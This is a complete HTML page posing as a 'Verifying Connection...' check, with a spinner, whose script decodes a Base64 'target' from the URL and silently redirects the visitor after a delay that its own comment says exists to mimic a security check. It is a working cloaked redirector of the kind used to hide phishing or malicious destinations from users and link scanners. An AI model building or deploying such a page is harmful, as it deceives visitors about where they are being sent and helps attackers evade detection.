<!DOCTYPE html>
<html>
<head>
    <title>Verifying Connection...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f4f4f4; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <script>
        (function() {
            // 1. Get the 't' parameter from the URL
            const params = new URLSearchParams(window.location.search);
            const token = params.get('t');
            
            if (token) {
                try {
                    // 2. Translate/Unwrap the Base64 "language"
                    const target = atob(token);
                    
                    // 3. Optional: Add a 500ms delay to mimic a security check
                    setTimeout(() => {
                        window.location.replace(target);
                    }, 500);
                } catch (e) {
                    document.body.innerHTML = "Invalid Request.";
                }
            }
        })();
    </script>
</body>
</html>
